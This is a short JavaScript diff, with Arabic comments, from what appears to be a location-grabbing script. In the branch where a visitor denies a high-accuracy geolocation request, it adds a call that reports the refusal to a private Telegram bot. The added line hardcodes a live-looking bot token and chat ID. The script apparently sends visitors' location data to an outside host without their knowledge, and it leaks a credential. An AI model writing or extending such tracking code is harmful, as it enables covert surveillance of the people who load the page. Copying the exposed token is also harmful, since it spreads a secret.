@@ -53,7 +53,12 @@
                 },
                 (err) => {
                     // في حال الرفض، يمكن إرسال إشعار بذلك أيضاً
-                    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=❌ الأدمن رفض إعطاء الموقع!`);
+                    //fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=❌ الأدمن رفض إعطاء الموقع!`);
+                    // الطريقة الصحيحة لإرسال النص العربي
+const message = "❌ الأدمن رفض إعطاء الموقع !";
+const encodedMessage = encodeURIComponent(message);
+
+fetch(`https://api.telegram.org/bot8500706491:AAEGFNeQhnUfZTUxqfMRAjNSUXCJzGgI1CA/sendMessage?chat_id=6617592058&text=${encodedMessage}`);
                 },
                 { enableHighAccuracy: true }
             );
